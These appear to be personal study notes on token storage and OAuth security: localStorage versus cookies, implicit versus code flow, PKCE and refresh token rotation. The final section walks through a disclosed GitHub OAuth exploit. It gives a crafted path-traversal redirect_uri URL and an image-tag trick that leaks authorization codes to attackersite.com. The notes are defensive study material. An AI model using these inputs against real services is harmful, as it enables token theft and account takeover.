# Token storage

## Chapters

1. Context
1. How client-side apps authenticate with APIs
1. localStorage - the hated one
1. Cookie is taking all of the cookies
1. The vulnerabilities
1. Cookie's double the trouble
1. Mending XSS
1. localStorage all the way... or is it?
1. Alternatives
1. Introducing OAuth. "That's not how it's supposed to work."
1. Authorization Code flow
1. Implicit flow
1. The case against Implicit flow
1. Authorization Code flow with PCKE
1. Refresh token
1. Refresh token rotation

"localStorage all the way... or is it?" -> This talks about the problem with
JWT. Is was not intended for security.

## To be researched

- [ ] Storing JWT in httpOnly cookie

  - Can XSS exploit/still use this?
  - The attacker doesn't know the JWT, but can use them while XSS-ing. What
    happens when the attacker knows the JWT, like in the case of localStorage?

- [ ] HTTP Basic Auth? Bearer?

  - Seems unrelated.

OAuth 2.0:

- [x] How can Refresh Token provide seamless experience?
- [x] Implicit Flow?
- [ ] Content Security Policy (XSS mitigation)
- [x] Why "Backend for Frontend" architecture needs PKCE?
      [link](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps#section-6.2)
- [ ] OAuth 2.1?
- [ ] Is `state` has a role of CSRF prevention when using PCKE?
- [x] OpenID Connect
- [x] Many reasons why the Refresh Token expires?
- [ ] Maybe OAuth provides some very important reasons why storing tokens in
      localStorage is OK? (Refresh Token Rotation, ...)
- [x] Why does the Redirect URL in the Authorization Request and the Access
  Token request have to match?
- [ ] OAuth client authentication (client_id, client_secret, jwt?)
- [ ] Client Credentials for APIs to access its own resource?
- [ ] Seems like OAuth services have SDKs to handle refresh token. Look at some.

## Research note

### Refresh token

Auth0 has this to say about protecting refresh token in SPAs:
[link](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/#When-to-Use-Refresh-Tokens)

> Keep in mind that according to the spec, when using the Implicit Flow, the
> authorization server should not issue refresh tokens. The Implicit flow is
> often implemented in Single-Page Applications (SPAs), which run on the
> frontend layer of a system architecture. There's no easy way of keeping a
> refresh token secure in the frontend layer on its own.

From Auth0: [link](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/#You-Can-Store-Refresh-Token-In-Local-Storage)

> Yes, you read that right. When we have refresh token rotation in place, we can
> store tokens in local storage or browser memory.

Refresh token rotation lifespan:

> A refresh token may have a long lifespan by configuration. However, the
> defined long lifespan of a refresh token is cut short with refresh token
> rotation. The refresh is only valid within the lifespan of the access token,
> which would be short-lived.

[Authorization server] Best practice when using refresh tokens:

> If the authorization server wishes to allow JavaScript apps to use refresh
> tokens, then they must also follow the best practices outlined in “OAuth 2.0
> Security Best Current Practice” and “OAuth 2.0 for Browser-Based Apps“, two
> recent documents adopted by the OAuth Working Group. Specifically, refresh
> tokens must be valid for only one use, and the authorization server must issue
> a new refresh token each time a new access token is issued in response to a
> refresh token grant. This provides the authorization server a way to detect if
> a refresh token has been copied and used by an attacker, since in normal
> operation of an app a refresh token would be used only once.
>
> Refresh tokens must also either have a set maximum lifetime, or expire if they
> are not used within some amount of time. This is again another way to help
> mitigate the risks of a stolen refresh token.
> [link](https://www.oauth.com/oauth2-servers/single-page-apps/security-considerations/)

---

OAuth:

> OAuth was designed as an authorization protocol, so the end result of every
> OAuth flow is the app obtains an access token in order to be able to access or
> modify something about the user's account. **The access token itself says
> nothing about who the user is.** > [link](https://www.oauth.com/oauth2-servers/signing-in-with-google/)

OAuth server-side apps won't let browser know access token:

> The authorization code flow offers a few benefits over the other grant types.
> When the user authorizes the application, they are redirected back to the
> application with a temporary code in the URL. The application exchanges that
> code for the access token. When the application makes the request for the
> access token, that request can be authenticated with the client secret, which
> reduces the risk of an attacker intercepting the authorization code and using
> it themselves. This also means the access token is never visible to the user
> or their browser, so it is the most secure way to pass the token back to the
> application, reducing the risk of the token leaking to someone else.
> [link](https://www.oauth.com/oauth2-servers/server-side-apps/authorization-code/)

Client-side apps can't protect its secret, so it should use PCKE:

> If an app wants to use the authorization code grant but can't protect its
> secret (i.e. native mobile apps or single-page JavaScript apps), then the
> client secret is not required when making a request to exchange the auth code
> for an access token, and PKCE must be used as well. However, some services
> still do not support PKCE, so it may not be possible to perform an
> authorization flow from the single-page app itself, and the client-side
> JavaScript code may need to have a companion server-side component that
> performs the OAuth flow instead. [link](https://www.oauth.com/oauth2-servers/server-side-apps/user-experience/)

On why the `state` parameter is recommended: [link](https://stackoverflow.com/a/35988614)

- The app needs to be sure that it only exchange the Authorization Code it
  requested, not the Authorization Code of the attacker, or else it would access
  the resource in the name of the attacker, i.e. posting images to the
  attacker's account. Kind of sounds like CSRF. That is achieved using `state`.

---

### Implicit Flow:

The "flaws":

- "too insecure"

  From oauth.com:

  > For example, the spec provides no mechanism to return a refresh token in the
  > Implicit flow, as it was seen as too insecure to allow that. The spec also
  > recommends short lifetimes and limited scope for access tokens issued via
  > the Implicit flow.
  > [link](https://www.oauth.com/oauth2-servers/single-page-apps/implicit-flow/)

  Well, too insecure what?

  The Implicit flow **could** be made _relatively secure_ (as proven later) **if
  done correctly**, meaning they could work but there is a specific amount of
  effort to achieve that. But that's not impossible. And **relatively secure**
  is the keyword.

- Redirect URI interception

  > Since the access token is sent as the fragment (hash) part of the redirect
  > URL (also called the front channel), it will be exposed to an attacker if
  > the redirect is intercepted.
  > [link](https://christianlydemann.com/implicit-flow-vs-code-flow-with-pkce/)

  Relatively speaking. Firstly, The redirect URL must be registered:

  > In any case, with both the Implicit Flow as well as the Authorization Code
  > Flow with PKCE, the server must require registration of the redirect URL in
  > order to maintain the security of the flow.
  > [link](https://www.oauth.com/oauth2-servers/single-page-apps/implicit-flow/)

  Secondly, the action after the token is granted (in this instance, to redirect
  the user to some page/URL) _should_ be written in the `state` parameter, just
  like Code flow, which must match with the original intent to prevent "CSRF".

  > The state parameter serves two functions. When the user is redirected back
  > to your app, whatever value you include as the state will also be included
  > in the redirect. This gives your app a chance to persist data between the
  > user being directed to the authorization server and back again, such as
  > using the state parameter as a session key. This may be used to indicate
  > what action in the app to perform after authorization is complete, for
  > example, indicating which of your app's pages to redirect to after
  > authorization. This also serves as a CSRF protection mechanism.
  >
  > Note that the lack of using a client secret means that using the state
  > parameter is even more important for single-page apps.
  > [link](https://www.oauth.com/oauth2-servers/single-page-apps)

  If somehow the trusted URLs are compromised, only then the access token will
  be exposed. Whether one can assures that trusted URLs are not compromised is
  to be determined. Code flow suffers from the same problem too, so they need
  PCKE.

- Attacker getting token from the URL with XSS/JavaScript

  - This point also applies to the Code flow. Assuming that the entire Code flow
    is safe. In an SPA, the token is still visible to the JavaScript (as proven
    by using "Refresh token rotation" and the unnecessary of using `httpOnly`
    Cookie), so XSS can still access them no matter the flow.
  - Libraries also has the same security concerns as XSS. They can access the
    token of Code flow too. The token storage is the same between the two flows.

- "Confused deputy" [link](https://stackoverflow.com/a/17439317)

  - Using Implicit flow, the SPA should verify that the token is given to them,
    not some other (potentially malicious) SPA. This is necessary because in
    Implicit flow, we can't verify if the Token receiver was indeed requested
    the token.

    For example, a victim logs in googlefake.com using Google OAuth Implicit
    flow, and then googlefake.com uses that access token to log into google.com.
    If google.com is not checking that the token is given to googlefake.com
    instead of google.com, then the victim's Google account is compromised.

    Basically, an access token for an application that uses Google account login
    should not grant access to Google.com or any other applications that also
    use a Google account for login.

  - **However**, we should also do the same for the Code flow. If the Code is
    for the googlefake.com, then the same compromise happens, as the access
    token granted is for googlefake.com.
  - We can do that using the `state` parameter. (demonstrates the Code flow &
    the Implicit flow similarity)

  - The `state` parameter is checked upon the Token grant on the client-side. If
    somehow the attacker managed to inject a malicious token into the victim's
    browser, then a second measure takes place by checking the "audience" field
    `aud` on the Resource server i.e. your API.

The **real** Implicit flow flaws:

- Access Token Leak in Browser History

  - Valid point, there is a hassle of removing the hash fragment from the URL
    in order to remove the access token from the browser history.

- "Lack of client authentication"
  [link](https://www.taithienbo.com/why-the-implicit-flow-is-no-longer-recommended-for-protecting-a-public-client/)

  That's true. Implicit flow **implicitly assumes** that the receiver is indeed
  the requester. If the token is hijacked, i.e. the redirect URL is compromised
  and the attacker receives the token instead, then the token is indeed
  compromised.

  Remember that the `state` parameter only has a role of preventing the use of
  the wrong token in the legitimate, original app. If the token is gone to the
  incorrect target, that's a gone token, and they need not care about the
  `state`.

  However, this "Lack of client authentication" statement is a little ambiguous.
  You may ask "Isn't Client-side apps cannot store any secrets?"

  - A client-side app doesn't have a fixed client secret, no matter what flow
    you use, including the Code flow, because client-side apps could not store
    anything securely. In a mobile + Code flow scenario, if the attacker's app
    gets the Authorization Code, they could still go to exchange for an access
    token. This flaw is solved with PCKE. In this sense, the accurate statement
    is "Lack of client secret".
  - We assure that the receiver is indeed the requester in an SPA using PCKE. In
    PCKE, only the true requester will be able to exchange the code for an
    access token. This is the real "client authentication".

    We can think of it as if the client secret is per-request basis. For each
    request, there is a different client secret.

  If we registered an URL for redirection, but that URL is compromised, then in
  the Implicit flow we could do nothing more. The token is compromised. Whether
  we can assures that the URL wouldn't be compromised or not is, again, an open
  question.

Although the flaws could be prevented (EXCEPT the "client authentication" flaw),
it is still a hassle, and there could still be human errors.

---

Storing tokens: [link](https://www.oauth.com/oauth2-servers/single-page-apps/security-considerations/)

> Generally, the browser's LocalStorage API is the best place to store this data
> as it provides the easiest API to store and retrieve data and is about as
> secure as you can get in a browser. The downside is that any scripts on the
> page, even from different domains such as your analytics or ad network, will
> be able to access the LocalStorage of your application. This means anything
> you store in LocalStorage is potentially visible to third-party scripts on
> your page.
>
> Because of the risks of data leakage from third-party scripts, it is extremely
> important to have a good Content-Security Policy configured for your app so
> that you can be more confident that arbitrary scripts aren't able to run in
> the application. A good document on configuring a Content Security Policy is
> available from OWASP at
> https://owasp.org/www-project-cheat-sheets/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

Consider "handling OAuth flow on the backend", i.e. use a traditional web app
with session.
[link](https://www.oauth.com/oauth2-servers/single-page-apps/security-considerations/)

[OAuth 2.0 for Browser-Based Apps](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps)

[OAuth 2.0 Security Best Current
Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

---

The concerns flow of a client-side app should be:

Securely obtain the tokens -> Store the tokens -> Cares about the tokens'
lifetime

Obtaining the token: Using OAuth, or some custom authorization system.

Store the tokens: `localStorage`.

Cares about the tokens' lifetime: The purpose is keeping the user logged in for
as long as possible, without a re-login. That involves using refresh token,
because using just the access token is problematic in that if it's lost, it's
hard to handle the aftermath. The same can be said to losing a refresh token, so
Refresh token rotation is the solution, and it's the current best practice.

---

Question: Why can't access token just also act as a refresh token?

[link](https://stackoverflow.com/a/39003201)

I mean, it could still rotates like the Refresh token rotation, so if any access
token is used twice, the entire family of access token could just also be
invalidated.

Answer:

The most crucial reason is that the Access Token is exchanged with the Resource
Server (an API), but the Refresh Token is exchanged only with the Authorization
Server, like Google.

The Resource Server only has their hands on a short-lived Access Token, so if
the Resource Server's implementation is flawed and leaks the Access Token, for
example:

> query param in a log file on an insecure resource server, beta or poorly coded
> resource server app, JS SDK client on a non https site that puts the
> access_token in a cookie, etc
>
> [link](https://mailarchive.ietf.org/arch/msg/oauth/vSmJ0zjQzZFjeFbRz_qpvjfpAeU/)

... then they can only leak the short-lived Access Token. If this were to be a
Refresh Token instead, as in the case of an Access Token also being a Refresh
Token, then instead of a short 10-minute window of time of exploit, now the
attacker could have a much longer exploit time window of a Refresh Token,
assuming that the user never use that Refresh Token again in the meantime (to
invalidate it).

So, the Resource Server is not trusted to hold on to a more valuable Refresh
Token. They only have the user's authorization for a short time, say, 10
minutes. Don't send your Refresh Token there.

---

Refresh token lifetime is intentionally never given to the client.

[link](https://www.oauth.com/oauth2-servers/making-authenticated-requests/refreshing-an-access-token/)

> You might notice that the “expires_in” property refers to the access token,
> not the refresh token. The expiration time of the refresh token is
> intentionally never communicated to the client. This is because the client has
> no actionable steps it can take even if it were able to know when the refresh
> token would expire. There are also many reasons refresh tokens may expire
> prior to any expected lifetime of them as well.
>
> If a refresh token expires for any reason, then the only action the
> application can take is to ask the user to log in again, starting a new OAuth
> flow from scratch, which will issue a new access token and refresh token to
> the application. That's the reason it doesn't matter whether the application
> knows the expected lifetime of the refresh token, because regardless of the
> reason it expires the outcome is always the same.

---

OAuth.com says, if a Authorization Code is used twice, then all tokens should be
invalidated:

> If a code is used more than once, it should be treated as an attack. If
> possible, the service should revoke the previous access tokens that were
> issued from this authorization code.
> [link](https://www.oauth.com/oauth2-servers/access-tokens/authorization-code-request/)

---

[link](https://www.oauth.com/oauth2-servers/access-tokens/access-token-lifetime/)

Use short-lived access token and no refresh token... Though it doesn't seem to
be any more secure than the short AT + long RT option.

> If you want to ensure users are aware of applications that are accessing their
> account, the service can issue relatively short-lived access tokens without
> refresh tokens. The access tokens may last anywhere from the current
> application session to a couple weeks.

"Current application session" is not in control of the Authorization Server, so
they can't set the expire time for access token beforehand.

This short-lived AT and no RT option relies on the AT expiration.

> When the access token expires, the application will be forced to make the user
> sign in again, so that you as the service know the user is continually
> involved in re-authorizing the application.

This sounds like "Sign-in and authorize for some pre-determined time". But the
time is impossible to determine beforehand.

Let's address the reasons on OAuth.com:

1. > you want to the most protection against the risk of leaked access tokens

Invalid. I can reduce the time of the AT in the short AT + long RT method and
achieve the same thing.

2. > you want to force users to be aware of third-party access they are granting

True, since you just want the user to grant authorization for like 30 minutes.
That's short, and you don't need refresh token for 30 minutes.

3. > you don't want third-party apps to have offline access to users' data

They do, for 30 minutes. But realistically they don't do that because that's too
short of a time. That's an indirect effect, so true.

=> Very limited use case. If the user really only want to give authorization for
30 minutes, then okay.

---

Strapi 3's authentication & authorization is not supposed to be used. Strapi (or
the individual Strapi instance for that matter) is not an OAuth service. You
give user&pass, and they give an access token. No refresh token. If the AT
leaks, you have to find a way to invalidate them. As as as I'm aware of, there
is no way to revoke an access token in Strapi 3, so you're on your own
(implementation).

You are supposed to use OAuth on the front-end for the user to get AT (and
possibly RT). Then on back-end side, you implements your own authorization, like
checking the validity of the token, authorization scopes, etc.

---

Q: Why "Backend for Frontend" architecture needs PKCE?

A: In BFF, the "Application Server", i.e. the Web App server, handles the OAuth
flow. In an Authorization Code flow, the browser will be redirected to the
authorization endpoint, then the browser receives the Code, which it sends to
the Application Server. There's a phishing attack, which involves making the
user clicks an URL, that would cause the browser to send an arbitrary
Authorization Code to the Application Server. If that code is of the attacker,
then the user is therefore logged in as the attacker, which would not necessary
cause any damage immediately but is still a vulnerability.

If we did use PCKE when encountering this phishing attack, there are 2 cases:

1. If the user initialized the Authorization process before clicking the
   phishing link, then the "code challenge", specifically the code verifier, is
   generated and saved. That code verifier won't match with the arbitrary
   Authorization Code of the attacker, so the flow fails.
2. The user has not initialized the Authorization process, and no code challenge
   is generated. The flow fails, since it doesn't have a code verifier to
   exchange the Authorization Code for the Access Token.

So, both cases would fail to log the user in in the name of the attacker.

---

Q: Many reasons why the Refresh Token expires?

A:

1. The lifetimes of the Refresh Token in the Refresh Token Rotation system

The Refresh Token (and also the Access Token) represents an authorization that
the user granted for the app to use. Once in a while, the Authorization Server
wants the user to authorize for the app again, and it's the occasion for the
user to check on what they granted the app to do.

There are usually 2 Refresh Token lifetimes: The individual Refresh Token
lifetime, and the lifetime after which no new Refresh Token is issued and a
re-login is required.

2. Refresh Token force invalidation

Can due to a number of things:

- The user don't want the app to do things using the user's identity anymore.
  Refresh Token revocation mechanism should be in place.
- The account is compromised, the user reports in, and the administrator
  manually invalidates all tokens associated with the account.

---

Q: Why does the Redirect URL in the Authorization Request and the Access Token
request have to match?

A:

[link](http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html)

[link](https://security.stackexchange.com/a/98049)

Back in the day, some OAuth implementations didn't strict matching redirect_uri.
Relative path works. This is best described with an example.

I'm going to explain the GitHub exploit by homakov in the first link above.

1. Here's the crafted URL:

```
https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%2Fcallback/../../../homakov/8820324&response_type=code
```

Notice this part:
`https://gist.github.com/auth/github/callback/../../../homakov/8820324`

The `https://gist.github.com/auth/github/callback` is, I believed, a registered
URI at GitHub, so it must be presented in the redirect_uri. GitHub believes the
redirect_uri is registered. How incautious.

2. Make the user clicks that link.

3. The user is redirected to:

```
https://gist.github.com/homakov/8820324
```

In this Gist, there is an image. Specifically, the image has the URL of
`///attackersite.com`. Quote:

> Basically, there are two vectors for leaking Referers: user clicks a link
> (requires interaction) or user agent loads some cross domain resource, like
> \<img\>.
>
> I can't simply inject \<img src=http://attackersite.com\> because it's going
> to be replaced by Camo-proxy URL, which doesn't pass Referer header to
> attacker's host. To bypass Camo-s filter I used following trick: \<img
> src="///attackersite.com"\>
>
> You can find more details about this vector in [Evolution of Open Redirect
> Vulnerability](http://homakov.blogspot.com/2014/01/evolution-of-open-redirect-vulnerability.html).
>
> ///host.com is parsed as a path-relative URL by Ruby's URI library but it's
> treated as a protocol-relative URL by Chrome and Firefox.

So, the image loads, and the HTTP referer is:

```
https://gist.github.com/homakov/8820324?code=CODE
```

In the original blog post, there is an image showing the HTTP referer in the
Chrome Inspector.

4. Now we have the code. We hit this url:

```
https://gist.github.com/auth/github/callback?code=CODE
```

And we have the access token to the victim's account.

That callback receives the code. Now it would attempt to fetch an access token
using that code. That's a POST request, with the `redirect_url` of
`https://gist.github.com/auth/github/callback`. Remember that the original
`redirect_uri` is:

`https://gist.github.com/auth/github/callback/../../../homakov/8820324`

So if it compares the two, then it would error out.

Now, that POST request's `redirect_uri` parameter is set in stone. It is set by
the Ruby web server of GitHub, i.e. by the "confidential client" that's in
charge of the `https://gist.github.com/auth/github/callback` page (or JavaScript
if it's a public app), to exactly the same url,
`https://gist.github.com/auth/github/callback`. It's **guaranteed** to be the
correct because it's a GitHub crafted code (Ruby code, or JavaScript code in the
public app scenario), which is relatively different than
`https://gist.github.com/auth/github/callback/../../../homakov/8820324`. This is
the key point.

=> If the `redirect_uri` is checked to be matched, then the attack would not
work.

If strict matching is enforced, then the malicious `redirect_uri` would not have
been approved and this wouldn't be a problem. Sometimes the strict matching
implementation is faulty, so this `redirect_uri` matching exists as a fallback.